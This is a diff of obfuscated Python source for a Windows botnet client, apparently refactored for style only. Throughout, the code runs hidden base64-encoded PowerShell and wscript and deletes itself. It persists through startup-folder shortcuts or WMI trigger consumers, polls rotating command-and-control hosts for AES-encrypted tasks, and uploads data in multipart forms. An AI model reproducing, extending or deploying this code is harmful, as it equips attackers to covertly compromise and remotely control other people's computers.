+			f'wscript.exe /B /Nologo {pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeDi}',
+			close_fds=True,
+			creationflags=0x00000008,
+		)
+
 		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeiD:
 			time_sleep(3)
 			self.__delete_file(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeDi)
@@ -985,21 +1013,22 @@ class BotActionsKlass(object):
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD=subprocess_call("powershell.exe -windowstyle hidden -enc {0}".format(self.b64utfencode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQziey)),creationflags=0x08000000)
 		except Exception as e:
 			pass
-		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD==0:
-			return True
-		return False
+		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD == 0
 
 
 	def self_delete(self,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzieD='''set {rand_param1} = WScript.CreateObject("Scripting.FileSystemObject")\n'''
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzieD+='''{rand_param2} = "Wscript.ScriptFullName"\n'''
+		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzieD = (
+			'''set {rand_param1} = WScript.CreateObject("Scripting.FileSystemObject")\n'''
+			+ '''{rand_param2} = "Wscript.ScriptFullName"\n'''
+		)
+
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzieD+='''Wscript.Sleep({randint})\n'''
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzieD+='''{rand_param1}.DeleteFile("{exe_path}")\n'''
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzieD+='''{rand_param1}.DeleteFile({rand_param2})\n'''
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQziDy="Start-Sleep {randint};Remove-Item \"{exe_path}\""
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQziDe=random_randint((botKlass.update_interval[1]+10)*1000,(botKlass.update_interval[1]+15)*1000)
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDye=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('force',False)
 		if self.detect_pshell():
+			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQziDy="Start-Sleep {randint};Remove-Item \"{exe_path}\""
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiey=self.b64utfencode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQziDy.format(randint=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQziDe/1000,exe_path=sys_argv[0]))
 			subprocess_popen("powershell.exe -windowstyle hidden -enc {0}".format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiey),stdin=None,stdout=None,stderr=None,close_fds=True,creationflags=0x08000000,startupinfo=v_startup_info)
 		else:
@@ -1014,8 +1043,11 @@ class BotActionsKlass(object):
 
 
 	def create_lnk(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeiy,save_to,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDz):
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDie='''set {rand_param} = WScript.CreateObject("WScript.Shell").CreateShortcut("{save_to}")\n'''
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDie+='''{rand_param}.TargetPath = "{target_path}"\n'''
+		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDie = (
+			'''set {rand_param} = WScript.CreateObject("WScript.Shell").CreateShortcut("{save_to}")\n'''
+			+ '''{rand_param}.TargetPath = "{target_path}"\n'''
+		)
+
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDie+='''{rand_param}.Save\n'''
 		if not os_path.exists(save_to):
 			os_mkdir(save_to)
@@ -1036,7 +1068,6 @@ class BotActionsKlass(object):
 			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD==0:
 				return{'key':{'type':'trigger','filter_name':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyziD,'consumer_name':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyzDe},'file':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiy}
 		except Exception as e:
-			pass
 			self.__delete_file(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiy)
 
 
@@ -1062,14 +1093,14 @@ class BotActionsKlass(object):
 	def register_appdata(self):
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeiD=os_path.join(self.local_appdata_dir,self.app_name)
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDe=self.exe_name
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDz=self.app_name+'.lnk'
+		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDz = f'{self.app_name}.lnk'
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDi=self.copy_and_clone_time(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeiD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDe)
 		self.create_lnk(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDi,self.startup_dir,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDz)
 		return{'key':{'type':'dir','path':os_path.join(self.startup_dir,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDz)},'file':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDi}
 
 
 	def register_tree(self):
-		return_value=dict()
+		return_value = {}
 		for registration_type in (self.register_pshell_bind, self.register_legacy, self.register_appdata):
 			try:
 				return_value=registration_type()
@@ -1081,8 +1112,7 @@ class BotActionsKlass(object):
 
 
 	def register(self):
-		return_value=self.register_tree()
-		return return_value
+		return self.register_tree()
 
 
 	def unregister(self):
@@ -1105,8 +1135,10 @@ class BotActionsKlass(object):
 
 	def format_info(self):
 		if botKlass.autoload_registered:
-			v_return_message="Registered to autoload\n"
-			v_return_message+="File path: {0}\n".format(botKlass.registered_settings['file'])
+			v_return_message = "Registered to autoload\n" + "File path: {0}\n".format(
+				botKlass.registered_settings['file']
+			)
+
 			if botKlass.registered_settings['key']['type']=='trigger':
 				v_return_message+="Filter name: {0}".format(botKlass.registered_settings['key']['filter_name'])
 				v_return_message+="Consumer name: {0}".format(botKlass.registered_settings['key']['consumer_name'])
@@ -1131,7 +1163,10 @@ class BotSelfActionsKlass(object):
 	def __init__(self,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
 		self.app_name=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('app_name',botKlass.autoload_settings['app_name'])
 		self.exe_name=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('exe_name',botKlass.autoload_settings['exe_name'])
-		self.exe_path=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('exe_path',None)
+		self.exe_path = pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get(
+			'exe_path'
+		)
+
 		self.platform=v_sys_platform
 		if self.platform=='win32':
 			self.autoloader=BotActionsKlass(self.app_name,self.exe_name,exe_path=self.exe_path)
@@ -1142,8 +1177,9 @@ class BotSelfActionsKlass(object):
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDez=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.pop('migrate',not bool(self.exe_path))
 		if botKlass.autoload_registered and not pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDye:
 			return{'status':'error','message':'already_registered'}
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.autoloader.register()
-		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie:
+		if (
+			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie := self.autoloader.register()
+		):
 			botKlass.registered_settings=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDi=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie.get('file',None)
 			if(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDez or botKlass.autoload_settings['delete_after'])and os_path.exists(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDi):
@@ -1167,7 +1203,6 @@ class BotSelfActionsKlass(object):
 				self.self_delete(force=True)
 				return True
 		except Exception as e:
-			pass
 			return False
 
 
@@ -1176,8 +1211,7 @@ class BotSelfActionsKlass(object):
 
 
 	def format_info(self):
-		v_return_message=self.autoloader.format_info()
-		return v_return_message
+		return self.autoloader.format_info()
 
 
 	def seppuku(self):
@@ -1197,7 +1231,7 @@ class HttpFormatKlass(object):
 
 
 	def get_content_type(self):
-		return 'multipart/form-data; boundary=%s'%self.boundary
+		return f'multipart/form-data; boundary={self.boundary}'
 
 
 	def add_field(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ):
@@ -1214,12 +1248,28 @@ class HttpFormatKlass(object):
 
 	def __str__(self):
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDie=[]
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyi='--'+self.boundary
+		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyi = f'--{self.boundary}'
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDie.extend([pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyi,'Content-Disposition: form-data; name="%s"'%pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyD,'',pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ,]for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ in self.form_fields)
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDie.extend([pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyi,'Content-Disposition: file; name="%s"; filename="%s"'%(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeziy,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeziD),'Content-Type: %s'%pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezDy,'',pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei,]for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeziy,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeziD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezDy,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei in self.files)
+		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDie.extend(
+			[
+				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyi,
+				'Content-Disposition: file; name="%s"; filename="%s"'
+				% (
+					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeziy,
+					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeziD,
+				),
+				f'Content-Type: {pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezDy}',
+				'',
+				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei,
+			]
+			for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeziy, pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeziD, pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezDy, pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei in self.files
+		)
+
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezDi=list(itertools_chain(*pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDie))
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezDi.append('--'+self.boundary+'--')
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezDi.append('')
+		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezDi.extend(
+			(f'--{self.boundary}--', '')
+		)
+
 		return '\r\n'.join(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezDi)
 
 
@@ -1271,8 +1321,6 @@ class HttpKlass(object):
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy=''
 		if encoded_cookie_data:
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy+='Cookie: {0}\r\n'.format(encoded_cookie_data)
-		if referer:
-			pass
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy=unicode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy)
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=b''
 		hInternet=ctype_wininet.InternetOpenW(unicode(self.user_agent),INTERNET_OPEN_TYPE_PRECONFIG,None,None,0)
@@ -1281,8 +1329,9 @@ class HttpKlass(object):
 		try:
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDy=ctype_wininet.HttpSendRequestW(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDz,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy,len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy),None,0)
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.__inet_read(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDz)
-			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzy=self.__query_content_encoding(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDz)
-			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzy:
+			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzy := self.__query_content_encoding(
+				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDz
+			):
 				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=CryptoKlass.unpack_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzy)
 			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDy:
 				ctype_wininet.InternetCloseHandle(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDy)
@@ -1299,8 +1348,11 @@ class HttpKlass(object):
 	def post_form(self,encoded_cookie_data,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzi):
 		ctype_wininet=ctypes.windll.wininet
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei=str(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzi)
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy='Accept-Encoding: identity\r\n'
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy+='Cookie: {0}\r\n'.format(encoded_cookie_data)
+		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy = (
+			'Accept-Encoding: identity\r\n'
+			+ 'Cookie: {0}\r\n'.format(encoded_cookie_data)
+		)
+
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy+='Content-type: {0}\r\n'.format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzi.get_content_type())
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy+='Content-length: {0}\r\n'.format(len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei))
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy+='Connection: close\r\n'
@@ -1343,9 +1395,12 @@ class HttpParserKlass(HTMLParser):
 	def handle_starttag(self,tag,attrs):
 		if tag=='a':
 			for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ in attrs:
-				if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyD=='href':
-					if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ and pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ[0]=='h':
-						self.links.append(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ)
+				if (
+					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyD == 'href'
+					and pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ
+					and pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ[0] == 'h'
+				):
+					self.links.append(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ)
 
 
 	def handle_starttag(self,tag,attrs):
@@ -1367,7 +1422,7 @@ class HttpParserKlass(HTMLParser):
 class NetworkHandlerKlass(object):
 
 	def __init__(self,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
-		self.__url=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('url',None)
+		self.__url = pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('url')
 		self.user_agent=botKlass.user_agent
 
 
@@ -1380,13 +1435,13 @@ class NetworkHandlerKlass(object):
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD=[]
 		while i<len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
 			k=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDyz+random_randint(1,5)
-			if k<4:
-				k=4
+			k = max(k, 4)
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDyi=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy[i:i+k]
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDiz=len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDyi)
 			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDiz>3:
 				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDiy=random_randint(min(2,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDiz),min(6,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDiz-1))
-				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDyi=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDyi[:pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDiy]+'='+pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDyi[pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDiy:]
+				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDyi = f'{pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDyi[:pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDiy]}={pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDyi[pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDiy:]}'
+
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD.append(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDyi)
 			i+=k
 		if len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD[-1])<4:
@@ -1406,7 +1461,7 @@ class NetworkHandlerKlass(object):
 
 	@property
 	def url(self):
-		return self.__url if self.__url else botKlass.current_host
+		return self.__url or botKlass.current_host
 
 
 	@property
@@ -1419,7 +1474,7 @@ class NetworkHandlerKlass(object):
 			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyzi.port:
 				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizyD=':{0}'.format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizyD)
 			referer="{0}://{1}{2}/".format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyzi.scheme,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyzi.netloc,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizyD)
-		return referer if referer else False
+		return referer or False
 
 
 	def decode_data(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
@@ -1450,21 +1505,18 @@ class NetworkHandlerKlass(object):
 		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ:
 			encoded_cookie_data=self.__encode_cookie(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ)
 		if botKlass.current_transport=='wininet':
-			pass
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyze=HttpKlass(url,self.user_agent)
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyze.send_request(encoded_cookie_data,self.referer)
 		else:
-			pass
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyzD=urllib2_build_opener()
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyzD.addheaders=[('User-agent',self.user_agent)]
 			if encoded_cookie_data:
 				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyzD.addheaders.append(('Cookie',encoded_cookie_data))
-			if self.referer:
-				pass
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyez=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyzD.open(url)
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyez.read()
-			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyeD=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyez.info().get('Content-Encoding')
-			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyeD:
+			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyeD := pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyez.info().get(
+				'Content-Encoding'
+			):
 				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=CryptoKlass.unpack_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyeD)
 		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy
 
@@ -1476,14 +1528,14 @@ class NetworkHandlerKlass(object):
 	def get_tasks(self):
 		networkTasks=[]
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDy=CryptoKlass(botKlass.get_key('aes'),botKlass.get_key('aes_iv'))
-		for h in range(botKlass.total_hosts):
-			for t in range(botKlass.total_transports):
-				for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyDe in range(3):
+		for _ in range(botKlass.total_hosts):
+			for _ in range(botKlass.total_transports):
+				for _ in range(3):
 					networkTasks=[]
 					try:
 						response_data=self.__send_request(id=botKlass.bot_id)
 						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy=self.decode_data(response_data)
-						if not 'tasks' in pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy:
+						if 'tasks' not in pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy:
 							return[]
 						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiezD=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy['tasks']
 						for networkTask in pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiezD:
@@ -1493,17 +1545,13 @@ class NetworkHandlerKlass(object):
 						botKlass.is_first_request=False
 						return networkTasks
 					except ExceptionKlass:
-						pass
 						time_sleep(random_randint(3,8))
 						continue
-					except(urllib2_httperror,ValueError,TypeError)as error:
+					except (urllib2_httperror,ValueError,TypeError) as error:
 						time_sleep(3)
-						pass
 					except urllib2_urlerror as error:
-						pass
 						time_sleep(5)
 					except Exception as e:
-						pass
 						time_sleep(10)
 				botKlass.change_transport()
 			botKlass.change_host()
@@ -1523,29 +1571,31 @@ class NetworkHandlerKlass(object):
 					return False
 				try:
 					time_sleep(random_randint(1,3))
-					pass
